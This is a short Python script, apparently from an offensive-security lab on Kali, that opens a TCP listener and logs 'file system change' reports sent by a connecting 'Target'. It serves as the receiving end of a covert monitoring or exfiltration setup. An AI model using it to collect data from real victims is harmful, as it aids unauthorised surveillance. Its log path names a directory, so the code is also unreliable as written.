import socket

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_address = ('192.168.75.135', 25000)
server_socket.bind(server_address)
server_socket.listen(5)
print("Server is listening for connections...")

client_socket, client_address = server_socket.accept()
print(f"[+] Target Connected from: {client_address}")


log_file_path = '/home/kali/Desktop'

try:
    while True:
        data = client_socket.recv(1024).decode('utf-8')
        if not data:
            break

        
        with open(log_file_path, 'a') as log_file:
            log_file.write(data + '\n')

        print(f"Received file system change from client: {data}")

except Exception as e:
    print(f"Error: {e}")

finally:
    client_socket.close()
    server_socket.close()
